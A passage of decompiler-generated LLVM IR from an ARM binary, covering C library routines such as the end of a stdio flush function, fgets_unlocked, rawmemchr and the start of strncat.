  %v2_1a71425 = icmp eq i32 %v0_1a714.pr, 0
  store i1 %v2_1a71425, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_1a71425, label %dec_label_pc_1a71c, label %dec_label_pc_1a668

dec_label_pc_1a668:                               ; preds = %dec_label_pc_1a5d8, %.thread11
  %v0_1a684 = phi i32 [ %v3_1a710, %.thread11 ], [ %v0_1a714.pr, %dec_label_pc_1a5d8 ]
  %v1_1a668 = inttoptr i32 %v0_1a684 to i8*
  %v2_1a668 = load i8, i8* %v1_1a668, align 1
  %v3_1a668 = zext i8 %v2_1a668 to i32
  store i32 %v3_1a668, i32* %r3.global-to-local, align 4
  %v1_1a66c = and i32 %v3_1a668, 64
  %v2_1a66c = icmp eq i32 %v1_1a66c, 0
  store i1 %v2_1a66c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_1a66c, label %.thread11, label %dec_label_pc_1a674

dec_label_pc_1a674:                               ; preds = %dec_label_pc_1a668
  %v2_1a678 = load i32, i32* @global_var_2891c.1192, align 4
  store i32 %v2_1a678, i32* %r3.global-to-local, align 4
  %v7_1a67c = icmp eq i32 %v2_1a678, 2
  store i1 %v7_1a67c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_1a67c, label %dec_label_pc_1a6b0, label %dec_label_pc_1a684

dec_label_pc_1a684:                               ; preds = %dec_label_pc_1a674
  %v1_1a684 = add i32 %v0_1a684, 56
  store i32 %v1_1a684, i32* @r4, align 4
  store i32 %v2_1a5c0, i32* @r0, align 4
  store i32 95952, i32* %r3.global-to-local, align 4
  store i32 ptrtoint (i8* @global_var_176c8.894 to i32), i32* %r1.global-to-local, align 4
  %v1_1a69c = call i32 @__pthread_return_void()
  %v0_1a6a0 = load i32, i32* @r4, align 4
  store i32 %v0_1a6a0, i32* %r0.global-to-local, align 4
  store i32 ptrtoint (i8* @global_var_176c8.894 to i32), i32* %r3.global-to-local, align 4
  %v1_1a6ac = call i32 @__pthread_return_0()
  store i32 %v1_1a6ac, i32* %r0.global-to-local, align 4
  %v0_1a6b0.pre = load i32, i32* @r6, align 4
  br label %dec_label_pc_1a6b0

dec_label_pc_1a6b0:                               ; preds = %dec_label_pc_1a674, %dec_label_pc_1a684
  %v0_1a6c4 = phi i32 [ %v0_1a684, %dec_label_pc_1a674 ], [ %v0_1a6b0.pre, %dec_label_pc_1a684 ]
  %v1_1a6b0 = inttoptr i32 %v0_1a6c4 to i32*
  %v2_1a6b0 = load i32, i32* %v1_1a6b0, align 4
  %v0_1a6b4 = load i32, i32* %sl.global-to-local, align 4
  %v2_1a6b4 = or i32 %v0_1a6b4, %v2_1a6b0
  %v1_1a6b8 = xor i32 %v2_1a6b4, 320
  store i32 %v1_1a6b8, i32* %r3.global-to-local, align 4
  %v1_1a6bc = and i32 %v1_1a6b8, 832
  %v2_1a6bc = icmp eq i32 %v1_1a6bc, 0
  store i1 %v2_1a6bc, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_1a6bc, label %dec_label_pc_1a6c4, label %bb39

dec_label_pc_1a6c4:                               ; preds = %dec_label_pc_1a6b0
  store i32 %v0_1a6c4, i32* @r0, align 4
  %v0_1a6c8 = call i32 @__stdio_wcommit()
  store i32 %v0_1a6c8, i32* %r0.global-to-local, align 4
  %v2_1a6cc = icmp eq i32 %v0_1a6c8, 0
  store i1 %v2_1a6cc, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_1a6cc, label %.thread5, label %.thread7

.thread5:                                         ; preds = %dec_label_pc_1a6c4
  %v1_1a6d0 = load i32, i32* @r6, align 4
  %v2_1a6d0 = inttoptr i32 %v1_1a6d0 to i32*
  %v3_1a6d0 = load i32, i32* %v2_1a6d0, align 4
  store i32 %v3_1a6d0, i32* %r3.global-to-local, align 4
  %v2_1a6d4 = add i32 %v1_1a6d0, 8
  %v3_1a6d4 = inttoptr i32 %v2_1a6d4 to i32*
  %v4_1a6d4 = load i32, i32* %v3_1a6d4, align 4
  %v2_1a6d8 = and i32 %v3_1a6d0, -65
  store i32 %v2_1a6d8, i32* %r3.global-to-local, align 4
  %v4_1a6dc = sdiv i32 %v3_1a6d0, 256
  store i32 %v4_1a6dc, i32* %r1.global-to-local, align 4
  %v3_1a6e0 = add i32 %v1_1a6d0, 28
  %v4_1a6e0 = inttoptr i32 %v3_1a6e0 to i32*
  store i32 %v4_1a6d4, i32* %v4_1a6e0, align 4
  %v1_1a6e4 = load i32, i32* %r1.global-to-local, align 4
  %v2_1a6e4 = trunc i32 %v1_1a6e4 to i8
  %v3_1a6e4 = load i32, i32* @r6, align 4
  %v4_1a6e4 = add i32 %v3_1a6e4, 1
  %v5_1a6e4 = inttoptr i32 %v4_1a6e4 to i8*
  store i8 %v2_1a6e4, i8* %v5_1a6e4, align 1
  %v0_1a6e8.pr.pr.pr = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_1a6e8.pr.pr.pr, label %.thread6, label %.thread7

.thread6:                                         ; preds = %.thread5
  %v1_1a6e8 = load i32, i32* %r3.global-to-local, align 4
  %v2_1a6e8 = trunc i32 %v1_1a6e8 to i8
  %v3_1a6e8 = load i32, i32* @r6, align 4
  %v4_1a6e8 = inttoptr i32 %v3_1a6e8 to i8*
  store i8 %v2_1a6e8, i8* %v4_1a6e8, align 1
  %v0_1a6ec.pr.pr.pr = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_1a6ec.pr.pr.pr, label %bb39, label %.thread7

.thread7:                                         ; preds = %dec_label_pc_1a6c4, %.thread5, %.thread6
  store i32 -1, i32* @r5, align 4
  br label %bb39

bb39:                                             ; preds = %dec_label_pc_1a6b0, %.thread6, %.thread7
  %v2_1a6f4 = load i32, i32* @global_var_2891c.1192, align 4
  store i32 %v2_1a6f4, i32* %r3.global-to-local, align 4
  %v7_1a6f8 = icmp eq i32 %v2_1a6f4, 2
  store i1 %v7_1a6f8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_1a6f8, label %.thread11, label %bb40

bb40:                                             ; preds = %bb39
  store i32 %v2_1a5c0, i32* %r0.global-to-local, align 4
  store i32 1, i32* %r1.global-to-local, align 4
  store i32 95952, i32* %r3.global-to-local, align 4
  call void @__pseudo_branch(i32 95952)
  br label %.thread11

.thread11:                                        ; preds = %bb39, %dec_label_pc_1a668, %bb40
  %v0_1a710 = load i32, i32* @r6, align 4
  %v1_1a710 = add i32 %v0_1a710, 32
  %v2_1a710 = inttoptr i32 %v1_1a710 to i32*
  %v3_1a710 = load i32, i32* %v2_1a710, align 4
  store i32 %v3_1a710, i32* @r6, align 4
  %v2_1a714 = icmp eq i32 %v3_1a710, 0
  store i1 %v2_1a714, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_1a714, label %dec_label_pc_1a714.dec_label_pc_1a71c_crit_edge, label %dec_label_pc_1a668

dec_label_pc_1a714.dec_label_pc_1a71c_crit_edge:  ; preds = %.thread11
  %v0_1a71c.pre = load i32, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_1a71c

dec_label_pc_1a71c:                               ; preds = %dec_label_pc_1a714.dec_label_pc_1a71c_crit_edge, %dec_label_pc_1a5d8
  %v0_1a71c = phi i32 [ %v0_1a71c.pre, %dec_label_pc_1a714.dec_label_pc_1a71c_crit_edge ], [ %v1_1a658, %dec_label_pc_1a5d8 ]
  %v1_1a71c = call i32 @_stdio_openlist_dec_use(i32 %v0_1a71c)
  store i32 %v1_1a71c, i32* %r0.global-to-local, align 4
  %v0_1a760.pre = load i32, i32* @r5, align 4
  br label %bb43

dec_label_pc_1a724:                               ; preds = %dec_label_pc_1a5cc
  %v1_1a724 = inttoptr i32 %.v1_1a5b8 to i8*
  %v2_1a724 = load i8, i8* %v1_1a724, align 1
  %v3_1a724 = zext i8 %v2_1a724 to i32
  %v1_1a728 = and i32 %v3_1a724, 64
  store i32 %v1_1a728, i32* %r3.global-to-local, align 4
  %v2_1a728 = icmp eq i32 %v1_1a728, 0
  store i1 %v2_1a728, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_1a728, label %bb41, label %dec_label_pc_1a734

bb41:                                             ; preds = %dec_label_pc_1a724
  br label %bb43

dec_label_pc_1a734:                               ; preds = %dec_label_pc_1a724
  %v0_1a734 = call i32 @__stdio_wcommit()
  store i32 %v0_1a734, i32* %r0.global-to-local, align 4
  %v2_1a738 = icmp eq i32 %v0_1a734, 0
  store i1 %v2_1a738, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_1a738, label %.thread16, label %bb42

.thread16:                                        ; preds = %dec_label_pc_1a734
  %v1_1a73c = load i32, i32* %r8.global-to-local, align 4
  %v2_1a73c = inttoptr i32 %v1_1a73c to i32*
  %v3_1a73c = load i32, i32* %v2_1a73c, align 4
  store i32 %v3_1a73c, i32* %r3.global-to-local, align 4
  %v2_1a740 = add i32 %v1_1a73c, 8
  %v3_1a740 = inttoptr i32 %v2_1a740 to i32*
  %v4_1a740 = load i32, i32* %v3_1a740, align 4
  store i32 %v4_1a740, i32* %r1.global-to-local, align 4
  %v2_1a744 = and i32 %v3_1a73c, -65
  store i32 %v2_1a744, i32* %r3.global-to-local, align 4
  %v4_1a748 = sdiv i32 %v3_1a73c, 256
  %v2_1a74c = trunc i32 %v4_1a748 to i8
  %v4_1a74c = add i32 %v1_1a73c, 1
  %v5_1a74c = inttoptr i32 %v4_1a74c to i8*
  store i8 %v2_1a74c, i8* %v5_1a74c, align 1
  %v0_1a750.pr.pr.pr = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_1a750.pr.pr.pr, label %.thread18, label %.thread21

.thread18:                                        ; preds = %.thread16
  %v1_1a750 = load i32, i32* %r1.global-to-local, align 4
  %v2_1a750 = load i32, i32* %r8.global-to-local, align 4
  %v3_1a750 = add i32 %v2_1a750, 28
  %v4_1a750 = inttoptr i32 %v3_1a750 to i32*
  store i32 %v1_1a750, i32* %v4_1a750, align 4
  %v1_1a754 = load i32, i32* %r3.global-to-local, align 4
  %v2_1a754 = trunc i32 %v1_1a754 to i8
  %v3_1a754 = load i32, i32* %r8.global-to-local, align 4
  %v4_1a754 = inttoptr i32 %v3_1a754 to i8*
  store i8 %v2_1a754, i8* %v4_1a754, align 1
  %v0_1a758.pr.pr.pr = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_1a758.pr.pr.pr, label %.thread20, label %.thread21

.thread21:                                        ; preds = %.thread16, %.thread18
  br label %bb43

bb42:                                             ; preds = %dec_label_pc_1a734
  br label %bb43

.thread20:                                        ; preds = %.thread18
  br label %bb43

bb43:                                             ; preds = %bb41, %bb42, %.thread21, %dec_label_pc_1a71c, %.thread20
  %v0_1a760 = phi i32 [ -1, %.thread21 ], [ 0, %bb41 ], [ %v0_1a760.pre, %dec_label_pc_1a71c ], [ -1, %bb42 ], [ 0, %.thread20 ]
  store i32 %v0_1a760, i32* %r0.global-to-local, align 4
  store i32 %v3_1a5ac, i32* @r4, align 4
  ret i32 %v0_1a760

; uselistorder directives
  uselistorder i32 %v0_1a760, { 1, 0 }
  uselistorder i32 %v3_1a710, { 1, 2, 0 }
  uselistorder i32 %v2_1a5c0, { 1, 0, 2, 3, 4, 5, 6 }
  uselistorder i32* %sl.global-to-local, { 1, 0, 2 }
  uselistorder i32* %r1.global-to-local, { 0, 1, 2, 3, 4, 5, 6, 8, 7, 9 }
  uselistorder i32* %r0.global-to-local, { 2, 3, 5, 9, 4, 10, 0, 6, 1, 7, 8 }
  uselistorder i1* %cpsr_z.global-to-local, { 0, 1, 2, 3, 11, 4, 6, 5, 7, 8, 9, 10, 14, 12, 13 }
  uselistorder i32 (i32)* @_stdio_openlist_dec_use, { 1, 0 }
  uselistorder i32 95952, { 0, 4, 5, 6, 1, 2, 7, 8, 9, 10, 11, 3 }
  uselistorder i32* bitcast (i32** @global_var_288e8.892 to i32*), { 3, 0, 4, 5, 1, 2 }
  uselistorder i32* @global_var_2cc60.1176, { 1, 4, 2, 0, 5, 3, 6 }
  uselistorder i32 ()* @__pthread_return_0, { 35, 34, 33, 32, 31, 30, 29, 28, 27, 26, 7, 6, 5, 25, 24, 23, 18, 22, 21, 4, 37, 40, 39, 36, 3, 2, 1, 17, 0, 16, 15, 14, 13, 12, 11, 10, 9, 8, 19, 20, 38 }
  uselistorder i32 ()* @__pthread_return_void, { 40, 39, 38, 37, 36, 35, 34, 33, 32, 31, 30, 29, 28, 27, 26, 25, 24, 23, 22, 5, 4, 3, 2, 21, 20, 19, 18, 17, 16, 8, 7, 6, 14, 13, 12, 1, 0, 43, 15, 47, 46, 45, 44, 42, 41, 10, 9, 11 }
  uselistorder i32 ptrtoint (i8* @global_var_176c8.894 to i32), { 10, 9, 8, 7, 6, 5, 4, 3, 2, 1, 0 }
  uselistorder label %bb43, { 4, 1, 2, 0, 3 }
  uselistorder label %.thread21, { 1, 0 }
  uselistorder label %.thread11, { 2, 0, 1 }
  uselistorder label %bb39, { 2, 1, 0 }
  uselistorder label %.thread7, { 2, 1, 0 }
  uselistorder label %dec_label_pc_1a6b0, { 1, 0 }
  uselistorder label %dec_label_pc_1a668, { 1, 0 }
  uselistorder label %dec_label_pc_1a5d8, { 1, 0 }
}

define i32 @__GI_fgets_unlocked(i8* %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %cpsr_c.global-to-local = alloca i1, align 1
  %cpsr_z.global-to-local = alloca i1, align 1
  %r2.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  store i32 %arg3, i32* %r2.global-to-local, align 4
  %tmp = ptrtoint i8* %arg1 to i32
  store i32 %arg2, i32* %r6.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_1a794 = icmp eq i32 %arg2, 0
  store i1 %v2_1a794, i1* %cpsr_z.global-to-local, align 1
  store i32 %tmp, i32* %r7.global-to-local, align 4
  store i32 %arg3, i32* @r5, align 4
  %tmp14 = icmp slt i32 %arg2, 1
  br i1 %tmp14, label %dec_label_pc_1a81c, label %dec_label_pc_1a800.preheader

dec_label_pc_1a800.preheader:                     ; preds = %entry
  store i32 %tmp, i32* @r4, align 4
  %v1_1a80015 = add i32 %arg2, -1
  store i32 %v1_1a80015, i32* %r6.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v7_1a80021 = icmp eq i32 %arg2, 1
  store i1 %v7_1a80021, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_1a80021, label %dec_label_pc_1a80c, label %dec_label_pc_1a7ac

dec_label_pc_1a7ac:                               ; preds = %dec_label_pc_1a800.preheader, %dec_label_pc_1a800.backedge
  %v1_1a80424.in = phi i32 [ %v0_1a804.pre, %dec_label_pc_1a800.backedge ], [ %arg3, %dec_label_pc_1a800.preheader ]
  %v1_1a7ac = add i32 %v1_1a80424.in, 16
  %v2_1a7ac = inttoptr i32 %v1_1a7ac to i32*
  %v3_1a7ac = load i32, i32* %v2_1a7ac, align 4
  store i32 %v3_1a7ac, i32* %r2.global-to-local, align 4
  %v1_1a7b0 = add i32 %v1_1a80424.in, 24
  %v2_1a7b0 = inttoptr i32 %v1_1a7b0 to i32*
  %v3_1a7b0 = load i32, i32* %v2_1a7b0, align 4
  %v3_1a7b4 = icmp uge i32 %v3_1a7ac, %v3_1a7b0
  store i1 %v3_1a7b4, i1* %cpsr_c.global-to-local, align 1
  %v9_1a7b4 = icmp eq i32 %v3_1a7ac, %v3_1a7b0
  store i1 %v9_1a7b4, i1* %cpsr_z.global-to-local, align 1
  br i1 %v3_1a7b4, label %dec_label_pc_1a7d4, label %dec_label_pc_1a7bc

dec_label_pc_1a7bc:                               ; preds = %dec_label_pc_1a7ac
  %v1_1a7bc = inttoptr i32 %v3_1a7ac to i8*
  %v2_1a7bc = load i8, i8* %v1_1a7bc, align 1
  %v5_1a7bc = add i32 %v3_1a7ac, 1
  store i32 %v5_1a7bc, i32* %r2.global-to-local, align 4
  %v2_1a7c0 = load i32, i32* @r4, align 4
  %v3_1a7c0 = inttoptr i32 %v2_1a7c0 to i8*
  store i8 %v2_1a7bc, i8* %v3_1a7c0, align 1
  %v0_1a7c4 = load i32, i32* @r4, align 4
  %v1_1a7c4 = inttoptr i32 %v0_1a7c4 to i8*
  %v2_1a7c4 = load i8, i8* %v1_1a7c4, align 1
  %v5_1a7c4 = add i32 %v0_1a7c4, 1
  store i32 %v5_1a7c4, i32* @r4, align 4
  %v2_1a7c8 = icmp ugt i8 %v2_1a7c4, 9
  store i1 %v2_1a7c8, i1* %cpsr_c.global-to-local, align 1
  %v7_1a7c8 = icmp eq i8 %v2_1a7c4, 10
  store i1 %v7_1a7c8, i1* %cpsr_z.global-to-local, align 1
  %v0_1a7cc = load i32, i32* %r2.global-to-local, align 4
  %v1_1a7cc = load i32, i32* @r5, align 4
  %v2_1a7cc = add i32 %v1_1a7cc, 16
  %v3_1a7cc = inttoptr i32 %v2_1a7cc to i32*
  store i32 %v0_1a7cc, i32* %v3_1a7cc, align 4
  br i1 %v7_1a7c8, label %dec_label_pc_1a80c, label %dec_label_pc_1a800.backedge

dec_label_pc_1a7d4:                               ; preds = %dec_label_pc_1a7ac
  %v1_1a80424 = inttoptr i32 %v1_1a80424.in to i8*
  %v3_1a7d4 = call i32 @getc_unlocked(i8* %v1_1a80424)
  %v4_1a7d4 = trunc i32 %v3_1a7d4 to i8
  %v5_1a7d8 = icmp eq i8 %v4_1a7d4, -1
  store i1 %v5_1a7d8, i1* %cpsr_c.global-to-local, align 1
  %v10_1a7d8 = icmp eq i32 %v3_1a7d4, -1
  store i1 %v10_1a7d8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v5_1a7d8, label %dec_label_pc_1a7e0, label %dec_label_pc_1a7fc

dec_label_pc_1a7e0:                               ; preds = %dec_label_pc_1a7d4
  %v0_1a7e0 = load i32, i32* @r5, align 4
  %v1_1a7e0 = inttoptr i32 %v0_1a7e0 to i8*
  %v2_1a7e0 = load i8, i8* %v1_1a7e0, align 1
  %v1_1a7e4 = and i8 %v2_1a7e0, 8
  %v2_1a7e4 = icmp eq i8 %v1_1a7e4, 0
  store i1 %v2_1a7e4, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_1a7e4, label %dec_label_pc_1a80c, label %dec_label_pc_1a81c

dec_label_pc_1a7fc:                               ; preds = %dec_label_pc_1a7d4
  %v3_1a7f0 = load i32, i32* @r4, align 4
  %v4_1a7f0 = inttoptr i32 %v3_1a7f0 to i8*
  store i8 %v4_1a7d4, i8* %v4_1a7f0, align 1
  %v0_1a7f4 = load i32, i32* @r4, align 4
  %v1_1a7f4 = inttoptr i32 %v0_1a7f4 to i8*
  %v2_1a7f4 = load i8, i8* %v1_1a7f4, align 1
  %v5_1a7f4 = add i32 %v0_1a7f4, 1
  store i32 %v5_1a7f4, i32* @r4, align 4
  %v2_1a7f8 = icmp ugt i8 %v2_1a7f4, 9
  store i1 %v2_1a7f8, i1* %cpsr_c.global-to-local, align 1
  %v7_1a7f8 = icmp eq i8 %v2_1a7f4, 10
  store i1 %v7_1a7f8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_1a7f8, label %dec_label_pc_1a80c, label %dec_label_pc_1a800.backedge

dec_label_pc_1a800.backedge:                      ; preds = %dec_label_pc_1a7fc, %dec_label_pc_1a7bc
  %v0_1a800.pre = load i32, i32* %r6.global-to-local, align 4
  %v0_1a804.pre = load i32, i32* @r5, align 4
  %v1_1a800 = add i32 %v0_1a800.pre, -1
  store i32 %v1_1a800, i32* %r6.global-to-local, align 4
  %v2_1a800 = icmp ne i32 %v0_1a800.pre, 0
  store i1 %v2_1a800, i1* %cpsr_c.global-to-local, align 1
  %v7_1a800 = icmp eq i32 %v0_1a800.pre, 1
  store i1 %v7_1a800, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_1a800, label %dec_label_pc_1a80c, label %dec_label_pc_1a7ac

dec_label_pc_1a80c:                               ; preds = %dec_label_pc_1a800.preheader, %dec_label_pc_1a7fc, %dec_label_pc_1a800.backedge, %dec_label_pc_1a7bc, %dec_label_pc_1a7e0
  %v0_1a80c = load i32, i32* @r4, align 4
  %v1_1a80c = load i32, i32* %r7.global-to-local, align 4
  %v3_1a80c = icmp uge i32 %v0_1a80c, %v1_1a80c
  store i1 %v3_1a80c, i1* %cpsr_c.global-to-local, align 1
  %v9_1a80c = icmp eq i32 %v0_1a80c, %v1_1a80c
  store i1 %v9_1a80c, i1* %cpsr_z.global-to-local, align 1
  %v2_1a810 = xor i1 %v9_1a80c, true
  %v3_1a810 = and i1 %v3_1a80c, %v2_1a810
  br i1 %v3_1a810, label %bb, label %.thread7

bb:                                               ; preds = %dec_label_pc_1a80c
  %v7_1a814 = inttoptr i32 %v0_1a80c to i8*
  store i8 0, i8* %v7_1a814, align 1
  %v0_1a818.pre = load i1, i1* %cpsr_c.global-to-local, align 1
  %v1_1a818.pre = load i1, i1* %cpsr_z.global-to-local, align 1
  br label %.thread7

.thread7:                                         ; preds = %dec_label_pc_1a80c, %bb
  %v1_1a818 = phi i1 [ %v1_1a818.pre, %bb ], [ %v9_1a80c, %dec_label_pc_1a80c ]
  %v0_1a818 = phi i1 [ %v0_1a818.pre, %bb ], [ %v3_1a80c, %dec_label_pc_1a80c ]
  %v2_1a818 = xor i1 %v1_1a818, true
  %v3_1a818 = and i1 %v0_1a818, %v2_1a818
  br i1 %v3_1a818, label %.dec_label_pc_1a820_crit_edge, label %dec_label_pc_1a81c

.dec_label_pc_1a820_crit_edge:                    ; preds = %.thread7
  %v0_1a820.pre = load i32, i32* %r7.global-to-local, align 4
  br label %dec_label_pc_1a820

dec_label_pc_1a81c:                               ; preds = %entry, %dec_label_pc_1a7e0, %.thread7
  store i32 0, i32* %r7.global-to-local, align 4
  br label %dec_label_pc_1a820

dec_label_pc_1a820:                               ; preds = %.dec_label_pc_1a820_crit_edge, %dec_label_pc_1a81c
  %v0_1a820 = phi i32 [ %v0_1a820.pre, %.dec_label_pc_1a820_crit_edge ], [ 0, %dec_label_pc_1a81c ]
  ret i32 %v0_1a820

; uselistorder directives
  uselistorder i1 %v9_1a80c, { 1, 0, 2 }
  uselistorder i32 %v1_1a80c, { 1, 0 }
  uselistorder i32 %v0_1a80c, { 0, 2, 1 }
  uselistorder i32 %v0_1a800.pre, { 2, 0, 1 }
  uselistorder i1 %v2_1a7e4, { 1, 0 }
  uselistorder i32 %v3_1a7ac, { 1, 0, 2, 3, 4 }
  uselistorder i32 %v1_1a80424.in, { 2, 1, 0 }
  uselistorder i32* %r7.global-to-local, { 0, 2, 1, 3 }
  uselistorder i32* %r6.global-to-local, { 2, 1, 0, 3 }
  uselistorder i32* %r2.global-to-local, { 1, 2, 3, 0 }
  uselistorder i1* %cpsr_z.global-to-local, { 1, 2, 8, 3, 4, 5, 6, 7, 0, 9 }
  uselistorder i1* %cpsr_c.global-to-local, { 1, 2, 7, 3, 4, 5, 6, 0, 8 }
  uselistorder i8 -1, { 1, 2, 3, 4, 5, 0 }
  uselistorder i8 9, { 1, 2, 3, 0, 4 }
  uselistorder label %dec_label_pc_1a820, { 1, 0 }
  uselistorder label %dec_label_pc_1a81c, { 2, 1, 0 }
  uselistorder label %.thread7, { 1, 0 }
  uselistorder label %dec_label_pc_1a80c, { 2, 1, 4, 3, 0 }
  uselistorder label %dec_label_pc_1a7ac, { 1, 0 }
}

define i32 @rawmemchr(i32 %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_1a84c:
  %v1_1a82c = urem i32 %arg1, 256
  store i32 %v1_1a82c, i32* @lr, align 4
  %v4_1a84c = mul nuw nsw i32 %v1_1a82c, 256
  %v5_1a84c = or i32 %v4_1a84c, %v1_1a82c
  %v4_1a854 = mul i32 %v5_1a84c, 65536
  %v5_1a854 = or i32 %v4_1a854, %v5_1a84c
  %v0_1a858.pre = load i32, i32* @ip, align 4
  br label %dec_label_pc_1a858

dec_label_pc_1a858:                               ; preds = %dec_label_pc_1a8c4, %dec_label_pc_1a858, %dec_label_pc_1a84c
  %v0_1a858 = phi i32 [ %v0_1a858.pre, %dec_label_pc_1a84c ], [ %v4_1a858, %dec_label_pc_1a858 ], [ %v4_1a858, %dec_label_pc_1a8c4 ]
  %v1_1a858 = inttoptr i32 %v0_1a858 to i32*
  %v2_1a858 = load i32, i32* %v1_1a858, align 4
  %v4_1a858 = add i32 %v0_1a858, 4
  store i32 %v4_1a858, i32* @ip, align 4
  %v2_1a860 = xor i32 %v2_1a858, %v5_1a854
  %v2_1a864 = add i32 %v2_1a860, 2130640639
  %v1_1a86c = sub i32 -1, %v2_1a860
  %v2_1a870 = xor i32 %v2_1a864, %v1_1a86c
  %v2_1a874 = and i32 %v2_1a870, -2130640640
  %v2_1a878 = icmp eq i32 %v2_1a874, 0
  br i1 %v2_1a878, label %dec_label_pc_1a858, label %dec_label_pc_1a880

dec_label_pc_1a880:                               ; preds = %dec_label_pc_1a858
  %v2_1a880 = inttoptr i32 %v0_1a858 to i8*
  %v3_1a880 = load i8, i8* %v2_1a880, align 1
  %v4_1a880 = zext i8 %v3_1a880 to i32
  %v9_1a888 = icmp eq i32 %v4_1a880, %v1_1a82c
  store i1 %v9_1a888, i1* @cpsr_z, align 1
  %v1_1a88c = add i32 %v0_1a858, 3
  %v1_1a890 = add i32 %v0_1a858, 1
  store i32 %v1_1a890, i32* @r2, align 4
  %v1_1a894 = add i32 %v0_1a858, 2
  br i1 %v9_1a888, label %bb, label %bb18

bb:                                               ; preds = %dec_label_pc_1a880
  ret i32 %v0_1a858

bb18:                                             ; preds = %dec_label_pc_1a880
  %v2_1a89c = inttoptr i32 %v1_1a890 to i8*
  %v3_1a89c = load i8, i8* %v2_1a89c, align 1
  %v4_1a89c = zext i8 %v3_1a89c to i32
  %v9_1a8a0 = icmp eq i32 %v4_1a89c, %v1_1a82c
  store i1 %v9_1a8a0, i1* @cpsr_z, align 1
  br i1 %v9_1a8a0, label %dec_label_pc_1a8a8, label %dec_label_pc_1a8b0

dec_label_pc_1a8a8:                               ; preds = %bb18
  ret i32 %v1_1a890

dec_label_pc_1a8b0:                               ; preds = %bb18
  %v2_1a8b0 = inttoptr i32 %v1_1a894 to i8*
  %v3_1a8b0 = load i8, i8* %v2_1a8b0, align 1
  %v4_1a8b0 = zext i8 %v3_1a8b0 to i32
  %v9_1a8b4 = icmp eq i32 %v4_1a8b0, %v1_1a82c
  store i1 %v9_1a8b4, i1* @cpsr_z, align 1
  br i1 %v9_1a8b4, label %dec_label_pc_1a8bc, label %dec_label_pc_1a8c4

dec_label_pc_1a8bc:                               ; preds = %dec_label_pc_1a8b0
  ret i32 %v1_1a894

dec_label_pc_1a8c4:                               ; preds = %dec_label_pc_1a8b0
  %v2_1a8c4 = inttoptr i32 %v1_1a88c to i8*
  %v3_1a8c4 = load i8, i8* %v2_1a8c4, align 1
  %v4_1a8c4 = zext i8 %v3_1a8c4 to i32
  %v9_1a8c8 = icmp eq i32 %v4_1a8c4, %v1_1a82c
  store i1 %v9_1a8c8, i1* @cpsr_z, align 1
  br i1 %v9_1a8c8, label %dec_label_pc_1a8d0, label %dec_label_pc_1a858

dec_label_pc_1a8d0:                               ; preds = %dec_label_pc_1a8c4
  ret i32 %v1_1a88c

; uselistorder directives
  uselistorder i32 %v4_1a858, { 2, 1, 0 }
  uselistorder i32 %v0_1a858, { 0, 1, 2, 3, 4, 6, 5 }
  uselistorder i32 %v5_1a84c, { 1, 0 }
  uselistorder i32 %v1_1a82c, { 2, 3, 4, 5, 6, 0, 1 }
  uselistorder i1* @cpsr_z, { 8, 9, 10, 11, 1, 2, 12, 13, 15, 16, 17, 18, 19, 20, 21, 22, 0, 3, 4, 14, 5, 6, 7, 23 }
  uselistorder i32 -2130640640, { 6, 7, 2, 0, 8, 3, 1, 4, 5 }
  uselistorder i32 2130640639, { 4, 0, 1, 2, 3 }
}

define i32 @__GI_strncat(i8* %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %cpsr_z.global-to-local = alloca i1, align 1
  %ip.global-to-local = alloca i32, align 4
  %lr.global-to-local = alloca i32, align 4
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  store i32 %arg2, i32* %r2.global-to-local, align 4
  %tmp = ptrtoint i8* %arg1 to i32
  store i32 %tmp, i32* %r0.global-to-local, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_1a8e0 = load i32, i32* @r4, align 4
  store i32 %v3_1a8e0, i32* %stack_var_-8, align 4
  store i32 %tmp, i32* %r3.global-to-local, align 4
  store i32 %tmp, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_1a8ec

dec_label_pc_1a8ec:                               ; preds = %dec_label_pc_1a8ec, %entry
  %v0_1a8ec = phi i32 [ %v5_1a8ec, %dec_label_pc_1a8ec ], [ %tmp, %entry ]
  %v1_1a8ec = inttoptr i32 %v0_1a8ec to i8*
  %v2_1a8ec = load i8, i8* %v1_1a8ec, align 1
  %v3_1a8ec = zext i8 %v2_1a8ec to i32
  store i32 %v3_1a8ec, i32* %ip.global-to-local, align 4
  %v5_1a8ec = add i32 %v0_1a8ec, 1
  store i32 %v5_1a8ec, i32* %r3.global-to-local, align 4
  %v2_1a8f0 = icmp eq i8 %v2_1a8ec, 0
  store i1 %v2_1a8f0, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_1a8f0, label %dec_label_pc_1a8f8, label %dec_label_pc_1a8ec

dec_label_pc_1a8f8:                               ; preds = %dec_label_pc_1a8ec
  %v0_1a8f8 = load i32, i32* %r2.global-to-local, align 4
